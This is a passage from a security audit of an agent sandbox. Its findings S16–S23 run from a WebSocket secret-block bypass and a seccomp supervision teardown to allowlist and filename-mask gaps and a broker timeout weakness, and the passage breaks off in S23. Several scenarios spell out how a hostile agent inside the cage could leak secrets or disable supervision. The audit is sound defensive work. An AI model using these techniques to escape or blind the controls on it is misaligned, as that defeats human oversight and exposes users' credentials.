Mechanism verified end to end. websocket.rs:751 sets `control: matches!(opcode, 0x8..=0xa)` with no RFC 6455 §5.5 length check and no FIN check; the only length rejection is the 64-bit MSB test at websocket.rs:735-739 (`if n >> 63 != 0 { return HeaderScan::Bad }`), which 0x7FFF_FFFF_FFFF_FFFF passes. The declared value lands in `self.payload_left` (websocket.rs:550). websocket.rs:596-598 bounds only the gather buffer (`let room = CONTROL_MAX.saturating_sub(...); let fits = piece.len().min(room)`), while websocket.rs:623 (`self.payload_left -= take as u64;`) keeps counting down, and the only call to `take_standalone` is in the control branch of `end_of_frame` (websocket.rs:658-664), reached only when `payload_left` hits 0. So the tee follows the bogus frame for the tunnel's life with `done` false and `spent()` false, and `follow` (websocket.rs:1006-1021) has nothing to report. I found no caller-side or upstream frame validation — `relay_websocket` forwards verbatim (websocket.rs:1158).

</details>

---

### S16 — `websocket_secret = block` does not stop a secret in the frames the cage pipelines behind its handshake — they are written into the upstream before they are scanned
| | |
|---|---|
| **Gravité** | Moyenne |
| **Emplacement** | `src/sandbox/proxy/websocket.rs:1060` |
| **Catégorie** | `toctou` |
| **Sous-système** | Proxy — WebSocket |
| **Statut** | confirmé par réfutation adversariale (confiance de l'analyste : haute) |

**Constat.** `relay_websocket` writes the client's pipelined bytes into the upstream's rustls send buffer at line 1060 — `upstream.conn.writer().write_all(client_pending)?;` — and only scans them 43 lines later, at line 1103: `let pending_seen = follow(&mut tee_up, client_pending, SecretWay::Out, &obs);`. The block path that follows (lines 1105-1111) calls `send_close_notify()` and then `flush_tls(&mut upstream.conn, &mut upstream.sock)`, and `flush_tls` loops `while conn.wants_write() { conn.write_tls(sock) }` (lines 924-931) — which drains the *already-encrypted application data* to the socket first, then the close_notify. The secret is delivered, then the tunnel is closed behind it.

Two comments assert the opposite. Line 1101-1102: "The bytes the cage already sent behind its handshake go through the same gate as the ones that follow: they are the first frames of the tunnel, not a preamble." And `allowlist/mod.rs:809-812` documents `Block`'s guarantee as "the scan runs on each chunk read from the cage, before that chunk is written on, so a secret whole inside one chunk never crosses." For this one chunk the order is inverted. (The in-loop path at lines 1146-1158 does get it right, which is why the e2e test `a_secret_leaving_through_a_websocket_crosses_or_not_by_the_configured_posture` passes: `ws_send_from_cage` (tests.rs:9593-9596) waits for the 101 before sending its frame, so it never exercises the pending path.)

`client_pending` is `br.buffer().to_vec()` (line 894) — everything the 8 KiB `BufReader` (mod.rs:476, `BufReader::new`) read past the request head. `read_head_buffered` is documented to leave those bytes in the reader (mod.rs:922-923), and the WS branch never drains them as a body (tunnel.rs:347-353), so they arrive here intact.

**Scénario.** A hostile cage does not wait for the 101. In one `write_all` to its TLS stream it sends the upgrade request head followed immediately by a masked text frame carrying a declared secret (up to ~8 KiB of frames fit in the BufReader). The proxy's `read_head_buffered` consumes the head and leaves the frames in `br.buffer()`; `relay_upgrade` hands them to `relay_websocket` as `client_pending`. Line 1060 encrypts them into the upstream connection's send buffer. Line 1103 spots the needle, `pending_seen && blocking` is true, and lines 1108-1109 flush — pushing the ciphertext of the secret-bearing frame out to the upstream, followed by close_notify. The operator's log shows the sighting and "tunnel closed", the upstream has the secret. Compare the loop path at line 1146, which scans before writing and does prevent this — so the bypass is available exactly once per tunnel, on the frames the attacker gets to choose.

**Correction proposée.** Build `tee_up`/`tee_down` and run the `follow` + `pending_seen && blocking` gate on `client_pending` *before* line 1060, and return without ever calling `upstream.conn.writer().write_all(client_pending)` when the gate trips. (Buffering then closing is not enough — `flush_tls` will emit whatever is already in the send buffer.)

**Rectification du vérificateur.** Severity down from high for the same reason as the control-frame finding: what leaks here is bounded to one ~8 KiB pre-101 chunk, on an adversarial-only path (a conformant client does not send data frames before the 101), and a cage that wants a secret past `block` already has a documented, unlimited evasion — LeakScan is per-message and byte-exact (websocket.rs:100-106), so splitting the value across two messages defeats it with no ordering trick at all. The finding's real weight is that the code contradicts its own stated invariant on the one path where the invariant is written down, and the fix (gate before line 1060) is cheap.

<details>
<summary>Preuve retenue par le vérificateur</summary>

The ordering is exactly as claimed. websocket.rs:1060 `upstream.conn.writer().write_all(client_pending)?;` runs on an already-handshaken rustls ClientConnection (the handshake was written and its response read at websocket.rs:836-843), so the plaintext is encrypted into `sendable_tls` immediately; the scan is only at websocket.rs:1103 and the block branch at :1105-1111 calls `send_close_notify()` then `flush_tls`, whose `while conn.wants_write() { write_tls }` (websocket.rs:923-931) drains the queued application-data records before the alert — and the sockets are still blocking at that point (`set_nonblocking` is at :1113-1114), so the flush completes. The input is reachable: `client_pending = br.buffer().to_vec()` (websocket.rs:894), read_head_buffered leaves everything past the head in the BufReader (mod.rs:922-923, and `Deadlined` delegates `fill_buf`/`consume` straight through, deadline.rs:61-69), the BufReader is the default 8 KiB (mod.rs:476), and the ws_upgrade branch returns into `relay_upgrade` without ever draining a body (tunnel.rs:346-352, 579-592). The e2e test does not cover it: `ws_send_from_cage` waits for the 101 (tests.rs:9592-9595) before sending its frame. The comment at websocket.rs:1101-1102 and the Block guarantee at allowlist/mod.rs:809-812 ("the scan runs on each chunk read from the cage, before that chunk is written on") are both false for this one chunk.

</details>

---

### S17 — A transient `ENOENT` from `SECCOMP_IOCTL_NOTIF_RECV` permanently ends exec and open supervision for the run
| | |
|---|---|
| **Gravité** | Moyenne |
| **Emplacement** | `src/sandbox/proc_enforce.rs:862` |
| **Catégorie** | `dos` |
| **Sous-système** | Seccomp et politique d'exec |
| **Statut** | confirmé par réfutation adversariale (confiance de l'analyste : haute) |

**Constat.** `recv_loop` retries only on `EINTR` and treats every other `NOTIF_RECV` failure as the end of supervision: `return; // ENOENT / hang-up: the cage's filter is gone`. `ENOENT` from `RECV` does not mean the filter is gone. `seccomp_unotify(2)` documents it as transient — the kernel wakes the supervisor on `down(&filter->notif->request)` and then finds no notification in `SECCOMP_NOTIFY_INIT` state because the target was killed by a signal between the wake and the `notify_lock`, and returns `-ENOENT` for that one call. The comment asserts a property the errno does not carry, and acting on it tears the run's supervision down: `supervise` falls into `close_supervision` (:783), which denies everything parked and closes the notification descriptor. From then on the kernel answers every notified `execve`/`openat` in the cage with `ENOSYS` (`seccomp_do_user_notification` returns `-ENOSYS` once `filter->notif` is freed) — or, if a `park_open` thread still holds its `dup` of the listener (:1599), the filter stays alive with nobody calling `RECV` and every subsequent notified syscall blocks forever.

**Scénario.** Not a policy bypass — the outcome is fail-closed — but it is a cage-triggerable and, more importantly, an accidentally-triggerable kill of the whole session. Any process killed at the instant it is parked in an `execve` can produce it: a `timeout`-wrapped build step, `xargs` reaping children, a Ctrl-C in the cage, or a hostile agent deliberately looping `pid = fork(); child: execve(...); parent: kill(pid, SIGKILL)` to hit the window. One hit and every later `execve` in the cage fails with `ENOSYS` (or hangs), so the agent session dies with no message that says why — and under `[fs] scan` every `open` dies with it. The launcher meanwhile keeps running with a supervisor thread that has silently stopped deciding.

**Correction proposée.** Treat `ENOENT` like `EINTR` — `continue` — since it means only that this one notification vanished. Distinguish the real hang-up explicitly rather than by errno: have `poll_readable` return the `revents` and exit the loop only on `POLLHUP` (no users of the filter remain), which is the condition `seccomp_notify_poll` actually reports, and keep `return` for errnos that really do describe a dead descriptor (`EBADF`, `ENOTTY`). Fix the comment at the same time so it stops asserting that `ENOENT` means the cage's filter is gone.

**Rectification du vérificateur.** Accurate, including the auditor's own framing that this is availability and not a policy bypass — post-teardown `execve`s fail `ENOSYS`, so nothing runs unsupervised. Two refinements on how easy it is to hit. The window needs the vanished notification to be the ONLY one in `SECCOMP_NOTIFY_INIT` state: RECV scans the whole list, so on a busy cage it usually finds another pending notification and returns that instead, and the `ENOENT` surfaces on a quiet or lightly-loaded supervisor. And the deliberate `fork`/`execve`/`kill` loop is more reliable than the accidental cases precisely because it keeps the list otherwise empty. The suggested fix is sound but the POLLHUP half needs care: `poll_readable` currently discards `revents` entirely (:2832-2841), so exiting on POLLHUP means changing its signature, and the loop would then need a second termination path for the case where the listener's last user is gone but the descriptor is still held by a `park_open` dup.

<details>
<summary>Preuve retenue par le vérificateur</summary>

src/sandbox/proc_enforce.rs:857-863 is exactly as quoted: only `ErrorKind::Interrupted` continues, every other errno hits `return; // ENOENT / hang-up: the cage's filter is gone`. The errno claim is right: kernel/seccomp.c's `seccomp_notify_recv` scans the notification list for a `SECCOMP_NOTIFY_INIT` entry after `down_interruptible` and returns `-ENOENT` when there is none, with the in-tree comment 'it could be that the task was interrupted by a fatal signal between the time we were woken and when we were able to acquire the rw lock'; seccomp_unotify(2) documents the same for `SECCOMP_IOCTL_NOTIF_RECV`. So `ENOENT` is per-notification, not per-listener, and the comment asserts a property the errno does not carry. The consequence chain checks out: `supervise` (:761-768) falls straight into `close_supervision` (:786-792), which does `pending.answer_all(false)` and closes the descriptor — and proc-shim/src/main.rs:101-103 states the resulting behaviour in the codebase's own words: 'drop ours so a supervisor exit tears the filter down (matched execve then fail closed with ENOSYS)'. The `park_open` variant is also real: :1613-1615 dups the notification fd for the parked thread, and the read-direction branch (:1645-1650) can hold that dup for as long as the supervisor lives, which keeps the filter's `notif` alive with nobody calling RECV. `poll_readable` (:2832-2841) returns `rc > 0`, so it does not distinguish POLLHUP from POLLIN — the loop has no other hang-up signal, which is why the errno was made to carry one.

</details>

---

### S18 — explain_clear reads deny rules through the allow-side WS opt-in, so every cleartext deny loses to a `{WS}` allow
| | |
|---|---|
| **Gravité** | Faible |
| **Emplacement** | `src/allowlist/mod.rs:1516` |
| **Catégorie** | `allowlist-bypass` |
| **Sous-système** | Allowlist — grammaire et évaluation |
| **Statut** | confirmé par réfutation adversariale (confiance de l'analyste : haute) |

**Constat.** `EgressPolicy::explain` was fixed (commit c7eb7fa) to scan its deny list with `Rule::matches_deny` — `Methods::admits_deny`, which reads a deny's verb set broadly — precisely because the `WS` opt-in in `Methods::admits` (mod.rs:250-255) was written to stop an *allowance* handing out a capability, and asking it of a deny inverts it: `Methods::Unspecified`, `Methods::Any` and every `Only` set not literally containing `"WS"` all answer `false` for the `WS` pseudo-verb. Its sibling `explain_clear` was not fixed. Line 1516 still reads `self.deny.iter().find(|r| r.matches(&req, &method))`, i.e. the allow-side reading, while the allow arm three lines below uses the same `matches`. So on the cleartext plane a `WS` request skips *every* deny spelling an operator can write — bare `deny host:80`, `deny host:*`, `deny http://host`, `{*} deny host` — and is then admitted by a `{WS} http://host` allow. The function's own doc comment (mod.rs:1499-1501) asserts the opposite: "**Deny wins, layer-agnostically** ... any deny rule (of any layer) whose [`RuleKind`] matches the request denies it" — the code additionally consults the method set, through the one reading that is wrong for a deny. `admits_deny`'s own doc (mod.rs:258-270) states the rule this violates: "on a deny there is no second choice to keep separate."

**Scénario.** Operator config: `[network] allow = ["{WS} http://ws.internal:8080"]`, `deny = ["ws.internal:*"]` (the port-agnostic host deny the guide tells operators to use). Reachable today through the policy-explaining surface: `sbx test net -X WS http://ws.internal:8080/x` routes to `explain_clear` (cli/test.rs:228 with `method` uppercased at cli/test.rs:59). The deny rule is `Host("ws.internal", Any)` with `Methods::Unspecified`; `matches(req, "WS")` calls `admits("WS")`, which returns false because `Unspecified` is not an `Only` set naming WS — so the deny is skipped and the `{WS}` allow answers `AllowedBy`. The tester prints ALLOWED for a destination the operator explicitly denied, on the surface whose stated purpose is that it "cannot drift from the wire". On the wire the hole is latent only because `cleartext.rs` passes the literal HTTP verb: its sibling absolute-form plane already maps an `Upgrade: websocket` request to `WS` (`forward.rs:89-90`, added exactly so "the opt-in is a property of the request, not of the transport that carried it here"), and `cleartext.rs` is documented as applying "the *same* HTTP policy as the tunneled plane". The moment it computes the verb the same way, an in-cage client picks which question is asked — send the upgrade headers and the deny list stops matching — which is verbatim the escape c7eb7fa closed on the inspected plane.

**Correction proposée.** Use the deny-side reading, matching `explain`: `self.deny.iter().find(|r| r.matches_deny(&req, &method))`. (`l4_decision` at mod.rs:1581 is already broader still — it matches denies by `RuleKind` alone — so this brings the third plane into line rather than inventing a fourth reading.) Correct the doc at mod.rs:1499-1501 to say the deny's own verb scope is honoured, read broadly.

**Rectification du vérificateur.** Real code inconsistency and an inaccurate doc, but the auditor's severity is too high and the exploitability claim needs trimming. There is no egress consequence today: the only wire caller, src/sandbox/proxy/cleartext.rs:63, passes the literal HTTP verb, and for any real verb `admits` and `admits_deny` agree (mod.rs:250-255 delegates), so the wire still denies a cleartext upgrade (judged as its literal `GET`). The other caller, netlearn's `already_allowed` (src/sandbox/netlearn.rs:240), can only see `Proto::Http` events whose method cleartext.rs logged literally, so `WS` never reaches it either; and a false 'already allowed' there merely suppresses a rule *proposal* (fail-safe). The concrete impact is therefore confined to `sbx test net -X WS http://...` reporting ALLOWED where the wire refuses — a diagnostic that lies in the permissive direction on a surface documented as unable to "drift from the wire" — plus a latent trap if cleartext.rs ever computes the verb the way forward.rs:89-90 does. Fix and doc correction as proposed are right.

<details>
<summary>Preuve retenue par le vérificateur</summary>

Verified in full. src/allowlist/mod.rs:1516 is literally `if let Some(rule) = self.deny.iter().find(|r| r.matches(&req, &method))`, i.e. `Rule::matches` (mod.rs:459-461 = `methods.admits(method) && kind.matches(req)`), while the sibling `explain` at mod.rs:1441 was changed to `matches_deny` (mod.rs:465-467 = `methods.admits_deny(...)`). `git show c7eb7fa` confirms the fix touched only the `explain` deny arm (one `-`/`+` line at 1430) and never `explain_clear`; no comment anywhere claims the omission was deliberate. `Methods::admits` (mod.rs:250-255) returns false for `WS` unless the set is an `Only` naming `WS`, so on the cleartext plane a `Methods::Unspecified` deny (`deny ws.internal:*`) does not match a `WS` question and a `{WS} http://ws.internal:8080` allow (classify accepts a method prefix on `http://` — grammar.rs:53-100 rejects prefixes only for `tcp://`) answers `AllowedBy`. The path to reach it is real: cli/test.rs:59 uppercases `-X`'s value with no verb validation, cli/test.rs:215-228 routes an `http://` target to `explain_clear`, so `sbx test net -X WS http://ws.internal:8080/x` prints ALLOWED for a destination the operator denied. The doc at mod.rs:1499-1501 ("any deny rule (of any layer) whose [`RuleKind`] matches the request denies it") does overstate what the code does.

</details>

---

### S19 — opens_every_host tests only `Request::url`, so a catch-all regex that matches via the canonical form escapes the catch-all label
| | |
|---|---|
| **Gravité** | Faible |
| **Emplacement** | `src/allowlist/mod.rs:503` |
| **Catégorie** | `control-evasion` |
| **Sous-système** | Allowlist — grammaire et évaluation |
| **Statut** | confirmé par réfutation adversariale (confiance de l'analyste : haute) |

**Constat.** `RuleKind::matches` for a `Regex` kind is `re.is_match(&req.url) || re.is_match(&req.canonical_url)` (mod.rs:533) — matching *either* form is a match, which the module doc spends a paragraph justifying (mod.rs:71-80). `Rule::opens_every_host` interrogates only one of the two: `.all(|req| re.is_match(&req.url))` at line 503. So it asks a strictly narrower question than the matcher answers, and its own comment states the false conclusion this produces: "A sentinel miss is a definite no" (line 489). It is not: a sentinel can miss on `url` and still match through `canonical_url`, which is all the matcher needs. The gap is systematic rather than a corner, because exactly one of the three sentinels — `Request::new("2001:db8::1", 9, "/x?y=1")` at line 499 — carries a query string, and the query is the one thing `canonical_url` drops (it is rebuilt from `segs`, mod.rs:430). Any pattern that is unsatisfiable in the presence of a `?` therefore fails the sentinel while admitting every real request. This never changes a verdict — the code says so — but the label is the deliberate legibility control that the whole `reject_catch_all` design leans on: the grammar refuses a bare `*` and points authors at `re:.*` on the explicit promise (grammar.rs:252-255) that a catch-all rule is at least *named* wherever a policy is displayed.

**Scénario.** Threat model: config may come from an untrusted project directory. The project's `[network]` table declares `allow = ["re:^https://[^?]*$"]`. Against sentinel 2 the URL as sent is `https://[2001:db8::1]:9/x?y=1`, which contains `?`, so `is_match` fails and `opens_every_host()` returns false — no `catch_all` flag in `sbx net rules` (config/view.rs:530/558/590), no "that rule matches every host" note in `sbx test net` (cli/test.rs:327). But the rule is a true catch-all: for any request, `canonical_url` is `https://<host>[:<port>]/<segments>` with the query removed and so never contains `?`, so `RuleKind::matches` returns true for every host, every port and every path. A user reviewing the project's policy before launch sees an opaque-looking regex with no warning, while the cage has unrestricted egress. `re:^https://[a-z0-9]` behaves the same way (it misses only the bracketed-IPv6 sentinel, and IP-literal CONNECTs are refused on the inspected path anyway).

**Correction proposée.** Ask the sentinels the same question the matcher asks: `.all(|req| self.kind.matches(req))` (which covers both `url` and `canonical_url`), and drop or reword the "a sentinel miss is a definite no" claim at line 489 so it describes the two-form matcher. Adding a query-free sentinel is not sufficient on its own — the two functions must interrogate the same predicate or they will drift again.

**Rectification du vérificateur.** Severity overstated at medium and the attacker framing is wrong. This changes no verdict — the function is labelling-only, as mod.rs:485-487 says — so the consequence is a missing advisory label, not egress. The 'untrusted project directory' framing does not hold: an untrusted project's whole `[network]` table is dropped (src/config/mod.rs:329), so a hostile project cannot get its regex into the policy `sbx net rules` renders in the first place; the misled reader is one reviewing a policy their own side already trusts. The auditor's own second example (`re:^https://[a-z0-9]`) is also not a true catch-all under the matcher — it fails on both forms for a bracketed-IPv6 host — so the query-bearing sentinel is the only real gap. The fix (ask `self.kind.matches(req)` so both forms are probed, and reword line 489) is correct and cheap.

<details>
<summary>Preuve retenue par le vérificateur</summary>

Line numbers and mechanism check out. src/allowlist/mod.rs:503 is `.all(|req| re.is_match(&req.url))`, while the matcher it is supposed to approximate, `RuleKind::matches`, is `re.is_match(&req.url) || re.is_match(&req.canonical_url)` (mod.rs:533; `matches_any_port` at mod.rs:556 likewise). So the sentinel probe is strictly narrower than the predicate, and the comment at mod.rs:489 ("A sentinel miss is a definite no ... the matcher only ever sees canonical URLs of this shape") is false as written. The demonstration holds: sentinel 2 at mod.rs:499 is `Request::new("2001:db8::1", 9, "/x?y=1")`, whose `url` is `https://[2001:db8::1]:9/x?y=1` while `canonical_url` drops the query (mod.rs:424-430, `canonical_segments` splits on '?' at mod.rs:588), so `re:^https://[^?]*$` misses the sentinel yet matches every real request through `canonical_url` — `opens_every_host()` returns false for a genuine catch-all, and the `catch_all` flag (config/view.rs:530/558/590) and the `sbx test net` note (cli/test.rs:327) are both silently omitted.

</details>

---

### S20 — split_method_prefix's doc claims a prefix-less entry is `Methods::Any`; the code returns `Methods::Unspecified`, and the difference is what `default_methods` keys on
| | |
|---|---|
| **Gravité** | Faible |
| **Emplacement** | `src/allowlist/grammar.rs:136` |
| **Catégorie** | `misleading-invariant` |
| **Sous-système** | Allowlist — grammaire et évaluation |
| **Statut** | confirmé par réfutation adversariale (confiance de l'analyste : haute) |

**Constat.** Line 136 states: "No `{` means [`Methods::Any`] and the whole entry as the body." The code four lines below returns `Ok((Methods::Unspecified, s))` (line 140), and the inline comment beside it says the opposite of the doc: "No prefix: all verbs now, but a per-app `default_methods` may narrow it." The two states are not interchangeable, and the whole reason they exist as separate variants is this distinction, spelled out at mod.rs:209-215: `Unspecified` is "the only state a per-app `default_methods` rewrites", while `Any` "is never rewritten by `default_methods`, so `{*}` is how a rule opts a host back out to every verb under a read-by-default app" — enforced at `apply_default_methods` (mod.rs:1623), which rewrites only `rule.methods == Methods::Unspecified`. The doc therefore asserts the exact inverse of the security-relevant property of the value the function returns.

**Scénario.** Not directly attacker-triggerable — the failure is a maintainer or reviewer trusting the contract. Someone auditing whether an app's `default_methods = ["GET","HEAD"]` read-by-default posture actually covers unscoped rules reads this doc, concludes a bare `allow api.example.com` yields `Methods::Any` and so is exempt from narrowing, and either "fixes" `apply_default_methods` to stop rewriting it (silently restoring all-verbs write access to every unscoped host in every read-by-default app) or signs off on a policy review on the strength of a guarantee that runs the other way. In a file whose comments are the primary specification, an inverted contract on the one field that decides whether writes are permitted is a live hazard.

**Correction proposée.** Change line 136 to name `Methods::Unspecified` and say what it means: all verbs on its own, but the one state a per-app `default_methods` may narrow at resolution — matching the inline comment at line 139 and the variant docs at mod.rs:209-215.

**Rectification du vérificateur.** Correct but minimal: a one-word doc error with no runtime effect and no attacker path. The 'maintainer breaks apply_default_methods' scenario is speculative — the inline comment one line below (grammar.rs:139) and the variant docs at mod.rs:209-215 both state the correct contract, and the rewrite is pinned by tests, so a reader has two nearby correct statements against one wrong one. Fix is the proposed rewording of grammar.rs:136.

<details>
<summary>Preuve retenue par le vérificateur</summary>

Verified verbatim. src/allowlist/grammar.rs:136 reads "No `{` means [`Methods::Any`] and the whole entry as the body." while grammar.rs:139-140 is `// No prefix: all verbs now, but a per-app `default_methods` may narrow it at resolution.` / `return Ok((Methods::Unspecified, s));`. The two variants are not interchangeable and the distinction is exactly the one the auditor names: mod.rs:209-215 says `Unspecified` "is the only state a per-app `default_methods` rewrites" and `Any` "is never rewritten by `default_methods`", and `apply_default_methods` enforces that with `if rule.layer.inspected() && rule.methods == Methods::Unspecified` (mod.rs:1623). So the doc names the one variant that would make the read-by-default narrowing a no-op. Under this codebase's own house rule that a comment asserting a false property is itself a defect, it stands.

</details>

---

### S21 — A wildcard `[fs]` mask entry silently skips any directory entry whose filename is not valid UTF-8, leaving the file open with no warning
| | |
|---|---|
| **Gravité** | Faible |
| **Emplacement** | `src/sandbox/fsmask.rs:289` |
| **Catégorie** | `policy-bypass` |
| **Sous-système** | Binds, masques et politique de fichiers |
| **Statut** | confirmé par réfutation adversariale (confiance de l'analyste : haute) |

**Constat.** `match_in_dir` expands a wildcard mask entry by matching directory entries against the pattern:

```rust
.filter(|e| {
    e.file_name()
        .to_str()
        .is_some_and(|n| matches_component(pattern, n))
})
```

`OsString::to_str()` returns `None` for any name that is not valid UTF-8, and `is_some_and` turns that into "does not match". A Linux filename is arbitrary non-NUL bytes, and `fspolicy::matches_component` is explicitly byte-oriented for exactly that reason ("Bytes, not chars: a filename is bytes on Linux", config/fspolicy.rs:190-191) — the matcher is correct, but the caller never hands it those bytes.

The failure is silent in both directions. `resolve_list` warns only when an entry matched NOTHING (fsmask.rs:269-274), so an entry that matched three of four candidates reports nothing; and `admit`'s loud refusal path (fsmask.rs:264-266) is never reached because the candidate was filtered out before it. This is a fail-open in a control whose whole contract is that it "can only take access away from the cage" (config/fspolicy.rs:72-74). Non-wildcard entries are unaffected (they go through `root.join(body)` at fsmask.rs:250 and never round-trip through `str`), and the `unmask` side fails CLOSED on the same conversion (`entry_names`, fsmask.rs:609-611) — this is the one place the direction is wrong.

**Scénario.** A user protects a project's credentials with `[fs] deny = ["certs/*.pem", "secrets/*"]` in their global config and launches an untrusted agent in a repository. The repository — or any tool that wrote into it under a non-UTF-8 locale, or an unpacked archive carrying Latin-1 names — contains `certs/priv\xe9.pem` and `secrets/\xff-token`. `expand` produces masks for every sibling with a UTF-8 name, prints no warning, and `sbx config show` lists the mask as active, while those two files are bound nowhere and stay fully readable to the cage. The agent reads them. The operator has no signal that the policy did not cover them: the only observable difference from full coverage is the absence of an entry in a list nobody diffs.

**Correction proposée.** Match on bytes rather than on a UTF-8 round-trip: take `let name = e.file_name();` and compare `std::os::unix::ffi::OsStrExt::as_bytes(name.as_os_str())` against `pattern.as_bytes()`, exposing `fspolicy::glob_match` (or a thin `matches_component_os`) as the byte-level entry point `matches_component` already delegates to. If a byte-level match is not wanted, at minimum count the skipped entries in `match_in_dir` and have `resolve_list` push a warning naming them, so a mask that cannot cover a file says so instead of reporting success.

**Rectification du vérificateur.** Two corrections. (a) It is not silent in every case: if the wildcard's *only* candidates are non-UTF-8, `matched == 0` and `resolve_list` does emit "`[fs] deny` entry `...` matches nothing in this project" (fsmask.rs:265-271). The silence requires at least one UTF-8 sibling to also match, which is the common case but not the whole claim. (b) The supporting citation is misread: the "Bytes, not chars: a filename is bytes on Linux" comment at config/fspolicy.rs:189-191 is about `?` not consuming a whole multi-byte character (matching the shell), not about supporting non-UTF-8 names — `matches_component`'s `&str` signature shows UTF-8 was the assumed input all along. Also note there is no attacker-driven step: the cage cannot induce the gap, because a masked path is a mountpoint (rename/rmdir return EBUSY) so it cannot rename a protected file into a non-UTF-8 name, and creating one buys it nothing. This is a coverage gap that depends on a user or tool having written a non-UTF-8 filename into a wildcard-protected directory — real, fail-open, and worth fixing, but correctly rated low.

<details>
<summary>Preuve retenue par le vérificateur</summary>

Verified verbatim: fsmask.rs:287-291 filters with `e.file_name().to_str().is_some_and(|n| matches_component(pattern, n))`, so a non-UTF-8 directory entry is treated as a non-match and never reaches `admit`. `matches_component` (config/fspolicy.rs:192-194) takes `&str` and delegates to the byte-level `glob_match`, so the byte matcher is reachable only through a UTF-8 round-trip. `resolve_list` warns only when an entry matched nothing at all (fsmask.rs:265-271), and the `admit` refusal warning (fsmask.rs:255-258) is downstream of the filter. The opposite direction does fail closed: `entry_names` returns `false` on the same conversion (fsmask.rs:609-611), so an unmask cannot open a path it cannot name. No comment or test anywhere in fsmask.rs or fspolicy.rs addresses non-UTF-8 filenames, so this is not a documented trade-off.

</details>

---

### S22 — `host_deadline` is a per-read socket timeout, not a per-exchange budget, so a trickling host resource wedges a broker connection indefinitely
| | |
|---|---|
| **Gravité** | Faible |
| **Emplacement** | `src/sandbox/broker.rs:1278` |
| **Catégorie** | `dos` |
| **Sous-système** | Brokers de credentials (ssh-agent, signer) |
| **Statut** | confirmé par réfutation adversariale (confiance de l'analyste : moyenne) |

**Constat.** `serve_conn` bounds the host leg with `stream.set_read_timeout(Some(spec.host_deadline))` (1278 for Unix, 1285 for TCP) and nothing else. Every host-side read then goes through `read_frame` (401-513), which under `LengthU32Be` does a 4-byte `read_exact` followed by a body `read_exact`, and under `Line` reads one byte at a time in a loop. `src/sandbox/deadline.rs:3-7` states the exact defect this creates: "`SO_RCVTIMEO` bounds a single `read`; a message read in pieces — a byte at a time, a line at a time, a length then a body — starts a fresh timeout on every piece. A sender that produces one byte just inside the timeout therefore holds the reader for as long as the message is allowed to be." The tree has a `Deadlined` adapter for exactly this and applies it to the *cage* leg (1427) and in the ssh-agent broker (sshagent.rs:660) — but never to `host`, `collect_reply` (660), or the query round trip (803). `host_deadline` is a manifest field the comment at 1131-1135 says may be raised "as far as ten minutes", and `MAX_REPLY_FRAMES` is 1024, so the wall-clock ceiling is effectively unbounded. The comment at 752-756 ("The caller sets the deadline on `host` before calling… A read timeout on the stream turns that into an error") asserts a bound the socket option does not actually provide.

**Scénario.** A config declares `[broker.vault] socket = "tcp://vault.internal:8200"` (admitted by the allowlist, and this leg is a raw `TcpStream` with no TLS of its own). An attacker who controls that endpoint, or who can sit on the path to it, answers each forwarded frame with one byte every `host_deadline - 1` seconds. Each `read_exact` inside `read_frame` returns after one byte and restarts the timeout, so the exchange never errors. The connection is pinned: one thread, one `bwrap` plugin process, one host connection, one of the 32 `MAX_CONCURRENT_CONNS` slots. Hostile in-cage code opens 32 such connections and the broker is dead for the rest of the session — every later cage connection is dropped at the ceiling — while 32 plugin processes and 32 host-side threads sit parked outside the cage's cgroup. The same shape applies to a local Unix target: any host daemon that hangs mid-frame produces it without an attacker.

**Correction proposée.** Wrap the host reads in the existing budget type, as the cage leg already does: give each exchange an `Instant::now() + spec.host_deadline` deadline and read through `super::deadline::Deadlined::new(host, deadline)` in `collect_reply` (line 660) and in `relay_one`'s query round trip (line 803), keeping the socket timeout as the complementary bound the `deadline` module documents. Correct the claim at 752-756 to say the socket timeout alone is not a per-message bound.

**Rectification du vérificateur.** Three corrections. (1) The stated attack overreaches on who can set the endpoint: src/config/mod.rs:226-230 says `socket` "is a fact about the machine and is read from the global config alone" — a hostile project config cannot point a broker at `tcp://attacker`. The attacker must be the operator of, or on-path to, an endpoint the machine owner already chose. (2) The comment at broker.rs:752-756 is not a lie: it claims a bound on a resource that "hangs", which SO_RCVTIMEO genuinely provides; it simply says nothing about a trickle. (3) In the TCP scenario the on-path attacker already reads and rewrites a plaintext leg into which the plugin substitutes the brokered credential, so a wedged connection is not the marginal harm there. What actually survives is a narrow availability gap: any host resource that trickles mid-frame pins a thread, plugin process, host connection and one of 32 slots for effectively unbounded wall time, and the tree's own `Deadlined` adapter — applied to the cage leg — is not applied here.

<details>
<summary>Preuve retenue par le vérificateur</summary>

Mechanism confirmed. broker.rs:1278/1285 set `set_read_timeout(Some(spec.host_deadline))` and that is the only bound on the host leg; `grep -n Deadlined::new src/sandbox/broker.rs` returns exactly one hit, line 1427, on `cage_r`. `read_frame` (401-430) does `read_exact(&mut len)` then `read_exact(&mut body)`, so under LengthU32Be a body arrives across many reads and SO_RCVTIMEO restarts on each, exactly the defect deadline.rs:3-7 documents. Neither `collect_reply` (640) nor `relay_one`'s query round trip (803-806) wraps `host`. MAX_REPLY_FRAMES=1024 (broker.rs:63) bounds frame count, not wall clock, and MAX_HOST_DEADLINE_SECS=600 (plugins/broker.rs:61) confirms the ten-minute ceiling. The test that pins the trickle (broker.rs:3075 `a_connection_that_says_nothing_is_closed_rather_than_held`) exercises the cage leg only. The asymmetry with the cage leg is real and undocumented.

</details>

---

### S23 — Refusal record files an attempt to add a constrained smartcard key (type 26) as an attempt to remove a key, and does not name type 24
| | |
|---|---|
| **Gravité** | Faible |
| **Emplacement** | `src/sandbox/sshagent.rs:584` |
| **Catégorie** | `audit-integrity` |
| **Sous-système** | Brokers de credentials (ssh-agent, signer) |
| **Statut** | confirmé par réfutation adversariale (confiance de l'analyste : haute) |

**Constat.** `refused_message_name` maps message types to the closed set of phrases the decision record carries:

```rust
7 | 17 | 25 => "to add a key to your agent",
8 | 18 | 26 => "to remove a key from your agent",
```

